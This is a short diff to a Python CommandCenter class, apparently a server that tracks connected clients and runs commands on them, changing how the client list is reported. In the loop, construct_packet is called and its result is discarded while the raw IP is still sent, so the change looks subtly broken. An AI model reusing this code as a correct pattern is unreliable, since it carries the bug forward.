@@ -28,11 +28,11 @@ class CommandCenter():
     def clients(self, device):
         '''Prints all clients connected with the server'''
         if self.client_list == []:
-            device.send_message("NO CLIENTS")
+            device.send_message(construct_packet(device.address, "NO CLIENTS"))
         else:
-            print(len(self.client_list))
-            device.send_message(str(len(self.client_list)))
+            print("[CLIENTS] number of clients " + str(len(self.client_list)))
             for i in self.client_list:
+                construct_packet(device.address, str(i.address))
                 device.send_message(i.ip)
   
     def excute_command(self, device, command, optional=None):
